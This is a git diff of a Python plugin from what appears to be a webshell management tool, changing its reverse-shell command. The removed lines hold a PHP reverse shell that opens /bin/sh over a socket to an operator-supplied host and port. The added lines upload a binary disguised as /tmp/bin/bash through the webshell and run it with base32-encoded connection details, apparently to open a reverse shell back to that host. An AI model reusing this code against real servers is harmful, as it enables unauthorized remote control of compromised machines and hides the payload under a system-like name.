@@ -1,19 +1,11 @@
 from libs.reverse_client_bash import main as bind
+from base64 import b32encode
+from os import getcwd, path
 from threading import Thread
+
 from libs.config import alias, color, is_windows
-from libs.myapp import delay_send
-
-
-def get_reverse_php(ip, port):
-    return """$sock = fsockopen("%s", "%s");
-$descriptorspec = array(
-        0 => $sock,
-        1 => $sock,
-        2 => $sock
-);
-$process = proc_open('/bin/sh', $descriptorspec, $pipes);
-proc_close($process);""" % (ip, port)
-
+from libs.myapp import delay_send, send
+from webshell_plugins.upload import run as upload
 
 @alias(True, func_alias="rs", l="lhost", p="port")
 def run(lhost: str, port: int):
@@ -30,11 +22,12 @@ def run(lhost: str, port: int):
     except ValueError:
         port = 23333
     print(color.yellow(f"Waring: You are using a testing command...."))
-    print(color.red(f"        It will behave strange on some Linux!"))
-    php = get_reverse_php(lhost, port)
-    t = Thread(target=delay_send, args=(2, php))
-    t.setDaemon(True)
-    t.start()
+    print(color.yellow(f"        Please make sure Port {port} open...."))
+    send("system('mkdir /tmp/bin');")
+    if upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/bin/bash", True):
+        t = Thread(target=delay_send, args=(2, "system('cd /tmp && chmod +x bin/bash && bin/bash %s');" % b32encode(f"{lhost} {port}".encode()).decode()))
+        t.setDaemon(True)
+        t.start()
     print(f"Bind port {color.yellow(str(port))}...\n")
     if (not bind(port)):
         print(color.red(f"Bind port error."))
